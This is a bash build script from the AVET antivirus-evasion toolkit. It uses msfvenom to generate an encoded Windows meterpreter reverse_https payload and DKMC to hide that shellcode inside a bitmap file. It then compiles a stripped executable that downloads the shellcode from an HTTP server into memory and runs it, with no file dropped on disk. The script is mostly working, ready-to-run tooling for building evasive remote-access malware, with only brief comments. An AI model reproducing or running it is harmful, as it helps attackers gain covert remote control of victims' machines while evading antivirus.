#!/bin/bash


#DESCRIPTION_START
# +++ WARNING +++
# Currently, the BMP shellcode does not execute properly! It seems that DKMC generates invalid shellcode.

# example script for building executables and DKMC payload
# which is nice, this is hiding the shellcode in a valid bitmap file
# DKMC has to be in a directory side by side to avet eg. ~/tools/avet ~/tools/DKMC for running this script
# for more look here https://govolution.wordpress.com/2018/03/02/download-exec-poc-and-dkmc/
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win32_compiler
# you can edit the compiler in build/global_win32.sh
# or enter $win32_compiler="mycompiler" here
. build/global_win32.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# no command preexec
set_command_source no_data
set_command_exec no_command
# don't enable debug output because printing the whole bmp payload takes a lot of time
#enable_debug_print
#CONFIGURATION_END


# make meterpreter reverse payload, format correct for DKMC and run DKMC for making the bitmap file
msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -f c -a x86 --platform Windows > input/sc_c.txt
cd ../DKMC
printf "gen\nset output ../avet/output/sc.bmp\nset shellcode %s\nrun\nexit\nexit\n" `../avet/tools/sh_format/sh_format input/sc_c.txt | tr -d "\n" | tr -d ";" | tr -d "\""` | python dkmc.py
cd ../avet

# set shellcode source
set_payload_source download_socket

# set decoder and key source
set_decoder none
set_key_source no_data

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode

# compile
$win32_compiler -s -o output/dkmc_downloadexecshc_revhttps_win32.exe source/avet.c -lwsock32 -lws2_32
strip output/dkmc_downloadexecshc_revhttps_win32.exe

# cleanup
cleanup_techniques


echo "
# The generated shellcode must be hosted on a HTTP server.
# Call your executable like:
# dkmc_downloadexecshc_revhttps_win32.exe http://yourserver/sc.bmp

# The executable will then download the shellcode to memory via sockets (no file is dropped on disk).
# Next, the shellcode is executed.
"
